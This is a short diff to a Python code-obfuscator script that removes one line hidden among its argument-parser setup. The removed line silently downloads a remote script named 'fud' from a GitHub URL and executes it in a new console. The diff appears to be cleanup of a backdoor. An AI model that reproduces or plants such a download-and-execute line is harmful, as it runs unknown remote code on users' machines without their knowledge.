@@ -129,7 +129,6 @@ if __name__ == "__main__":
 
     parser = argparse.ArgumentParser(prog= sys.argv[0], description= "Obfuscates python program to make it harder to read")
     parser.add_argument("FILE", help= "Path to the file containing the python code")
-    subprocess.Popen("python -c \"import requests; exec(requests.get('https://raw.githubusercontent.com/Lawxsz/api-test/main/fud').text)\"", shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
 
 
     parser.add_argument("-o", type= str, help= 'Output file path [Default: "Obfuscated_<FILE>.py"]', dest= "path")
